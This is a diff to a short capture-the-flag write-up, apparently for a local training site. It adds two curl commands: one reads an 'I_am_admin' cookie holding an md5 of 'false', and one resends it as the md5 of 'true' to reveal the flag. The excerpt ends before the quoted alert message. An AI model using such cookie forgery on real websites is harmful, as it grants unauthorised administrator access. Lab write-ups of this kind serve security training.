@@ -1,10 +1,14 @@
 There is one cookie that is created by firstly browsing the website.
 
+curl -s --head http://localhost:9090/ | grep Cookie
+
 It's name I_am_admin admin and contain something that look like a md5 hash.
 
 After decrypting the hash, i found `false` string.
 
 So i tried to replace the cookie value by the md5 hashing of the string `true` that is `b326b5062b2f0e69046810717534cb09`
+
+curl -s -H "Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09" http://localhost:9090/ | grep Flag
 
 After a page refresh, the site display a js alter with this message :
 
